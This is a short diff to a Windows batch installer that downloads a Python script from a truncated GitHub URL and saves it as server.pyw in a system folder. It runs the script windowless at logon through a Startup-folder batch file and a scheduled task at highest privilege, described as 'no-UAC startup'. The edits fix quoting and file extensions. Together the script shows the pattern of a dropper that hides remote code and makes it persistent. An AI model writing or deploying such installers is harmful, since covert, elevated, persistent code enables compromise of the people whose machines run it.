@@ -28,7 +28,7 @@ powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/m
 if exist "%SYSFOLDER%\server.pyw" (
     echo [✓] Python script saved
 ) else (
-    echo [X] Failed to download server.py
+    echo [X] Failed to download server.pyw
     pause
     exit /b
 )
@@ -38,8 +38,8 @@ set STARTUPBAT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\run_scrip
 
 (
     echo @echo off
-    echo cd %SYSFOLDER%
-    echo pythonw %SYSFOLDER%\server.pyw
+    echo cd "%SYSFOLDER%"
+    echo pythonw "%SYSFOLDER%\server.pyw"
     echo exit
 ) > "%STARTUPBAT%"
 
@@ -55,7 +55,7 @@ if %errorlevel% equ 0 (
 :: Use full path to Python
 for /f "tokens=*" %%i in ('where python') do set PYTHON=%%i
 
-schtasks /Create /SC ONLOGON /RL HIGHEST /TN "%TASKNAME%" /TR "\"%PYTHON%\" \"%SYSFOLDER%\server.py\"" >nul 2>&1
+schtasks /Create /SC ONLOGON /RL HIGHEST /TN "%TASKNAME%" /TR "\"%PYTHON%\" \"%SYSFOLDER%\server.pyw\"" >nul 2>&1
 
 if %errorlevel% equ 0 (
     echo [✓] Task Scheduler setup for no-UAC startup
